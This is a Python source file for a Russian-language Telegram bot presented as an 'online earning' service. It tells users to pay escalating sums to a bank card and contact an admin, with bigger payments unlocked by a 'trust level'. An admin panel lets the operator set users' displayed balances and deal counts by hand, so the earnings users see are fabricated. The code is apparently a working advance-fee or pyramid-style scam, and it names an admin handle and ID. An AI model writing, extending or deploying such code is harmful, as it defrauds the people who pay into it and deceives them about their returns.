from model import *
from telebot import types, TeleBot

token = input()
bot = TeleBot(token)
admin = 1633567239

menu = types.ReplyKeyboardMarkup(resize_keyboard=True)
button1 = types.KeyboardButton("Заработать")
button2 = types.KeyboardButton("Баланс")
button3 = types.KeyboardButton("FAQ")
menu.row(button1)
menu.row(button2, button3)

earn = types.ReplyKeyboardMarkup(resize_keyboard=True)
btn1 = types.KeyboardButton('10 человек - 10%')
btn2 = types.KeyboardButton('5 человек - 20%')
btn3 = types.KeyboardButton('4 человека - 25%')
btn4 = types.KeyboardButton('Пополам убыток и доход')
btn5 = types.KeyboardButton('Назад')
earn.row(btn1, btn2)
earn.row(btn3, btn4)
earn.row(btn5)

adm = types.ReplyKeyboardMarkup(resize_keyboard=True)
btn1 = types.KeyboardButton('Сделать рассылку')
btn2 = types.KeyboardButton('Увеличить баланс')
btn3 = types.KeyboardButton('Увеличить кол-во сделок')
adm.row(btn1)
adm.row(btn2)
adm.row(btn3)

@bot.message_handler(commands=['Start', 'start'])
def start(message):
    if not(Users.user_exists(message.chat.id)):
        Users.create_user(message.chat.id)
    bot.send_message(message.chat.id, 'Приветсвую Вас в боте для онлайн заработка', reply_markup=menu)

@bot.message_handler(content_types=['text'])
def lalala(message):
    if message.chat.type == 'private':
        if message.text == 'Заработать':
            bot.send_message(message.chat.id, 'Выберете один вариант:', reply_markup=earn)
        elif message.text == 'Баланс':
            bot.send_message(message.chat.id, f'Вы заработали с нами: {Users.get_balance(message.chat.id, 0, 1)} рублей.\nВы провели с нами {Users.get_n(message.chat.id, 0, 1)} сделок.\nУровень вашей доверенности: {Users.get_n(message.chat.id, 0, 1)//10+1}')
        elif message.text == 'FAQ':
            bot.send_message(message.chat.id, '.')
        elif message.text == '10 человек - 10%':
            bot.send_message(message.chat.id, 'Переведите 85 рублей на карту 2200 19.. .... .... в комментарии к платежу укажите свой юзернейм/имя в тг, после чего напишите админу @ilnurKhalikov')
        elif message.text == '5 человек - 20%':
            if Users.get_n(message.chat.id, 0, 1)//10+1 >= 2:
                bot.send_message(message.chat.id, 'Переведите 138 рублей на карту 2200 19.. .... .... в комментарии к платежу укажите свой юзернейм/имя в тг, после чего напишите админу @ilnurKhalikov')
            else:
                bot.send_message(message.chat.id, 'У вас недостаточный уровень доверенности для этого варианта заработка')
        elif message.text == '4 человека - 25%':
            if Users.get_n(message.chat.id, 0, 1)//10+1 >= 3:
                bot.send_message(message.chat.id, 'Переведите 158 рублей на карту 2200 19.. .... .... в комментарии к платежу укажите свой юзернейм/имя в тг, после чего напишите админу @ilnurKhalikov')
            else:
                bot.send_message(message.chat.id, 'У вас недостаточный уровень доверенности для этого варианта заработка')
        elif message.text == 'Пополам убыток и доход':
            if Users.get_n(message.chat.id, 0, 1)//10+1 >= 4:
                bot.send_message(message.chat.id, 'Переведите 275 рублей на карту 2200 19.. .... .... в комментарии к платежу укажите свой юзернейм/имя в тг, после чего напишите админу @ilnurKhalikov , если хотите заработать ещё больше денег, то отправьте ещё 275 рублей на карту выше, и напишите админу "Повышенный доход"')
            else:
                bot.send_message(message.chat.id, 'У вас недостаточный уровень доверенности для этого варианта заработка')
        elif message.text == 'Назад':
            bot.send_message(message.chat.id, 'Приветсвую Вас в боте для онлайн заработка', reply_markup=menu)
        elif message.chat.id == admin:
            if message.text == 'Админ' or message.text == 'админ' or message.text == 'Admin' or message.text == 'admin':
                bot.send_message(message.chat.id, 'Админ панель', reply_markup=adm)
            elif message.text == 'Сделать рассылку':
                bot.send_message(message.chat.id, 'Введите текст')
                bot.register_next_step_handler(message, rasslka)
            elif message.text == 'Увеличить баланс':
                bot.send_message(message.chat.id, 'Введите через пробел айди пользователя и на сколько увеличился баланс')
                bot.register_next_step_handler(message, balance)
            elif message.text == 'Увеличить кол-во сделок':
                bot.send_message(message.chat.id, 'Введите через пробел айди пользователя и на сколько увеличилось кол-во сделок')
                bot.register_next_step_handler(message, deals)
            else:
                bot.send_message(message.chat.id, 'Это не установленная команда', reply_markup=menu)
        else:
            bot.send_message(message.chat.id, 'Это не установленная команда', reply_markup=menu)

def rasslka(message):
    db = sqlite3.connect('user.db')
    sql = db.cursor()
    sql.execute("SELECT user_id FROM users")
    id = sql.fetchall()
    for id in id:
        for id in id:
            try:
                bot.send_message(id, f"{message.text}")
            except:
                pass
    bot.send_message(message.chat.id, "Рассылка завершена", reply_markup=menu)
    db.commit()

def balance(message):
    try:
        text = message.text.split()
        Users.get_balance(text[0], int(text[1]), 2)
        bot.send_message(admin, 'Баланс изменён', reply_markup=menu)
    except:
        bot.send_message(admin, 'Нет такого пользователя или просто еррор')

def deals(message):
    try:
        text = message.text.split()
        Users.get_n(text[0], int(text[1]), 2)
        bot.send_message(admin, 'Кол-во сделок изменено', reply_markup=menu)
    except:
        bot.send_message(admin, 'Нет такого пользователя или просто еррор')

while True:
    try:
        bot.polling()
    except Exception as e:
        print(e)
